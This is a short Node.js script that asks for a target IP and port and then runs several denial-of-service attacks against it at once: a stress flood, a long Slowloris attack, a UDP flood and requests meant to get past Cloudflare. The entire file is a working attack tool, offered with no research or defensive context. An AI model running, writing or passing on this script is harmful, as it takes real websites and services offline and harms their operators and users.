const os = require("os");
const cloudscraper = require('cloudscraper-version.two');
prompt = require("prompt-sync")()
const Stress = require("ddos-stress");
const request = require("request");
const Loris = require("@anzerr/slowloris.tool");
const deathproject = require("deathproject_v1");
const stress = new Stress ();


var IP = prompt("IP >");
var PORT = prompt("Port >");
var Kira = require('kira');
var api = new Kira();

stress.run(""+ IP +":"+ PORT +"", 5000)
let l = new Loris("http://"+ IP +":"+ PORT +"", 300000).attack();
deathproject.DdosIp('UDP', IP, PORT, '20000');
cloudscraper.getting("https://"+ IP);
api.kill('http://'+ IP +'', 200, 10000, 'https://'+ IP +':'+ PORT +'');

return new Promise((resolve) => l.once("end", resolve))
  .then(() => {
    console.log("attack ended");
  })
  .catch(console.log);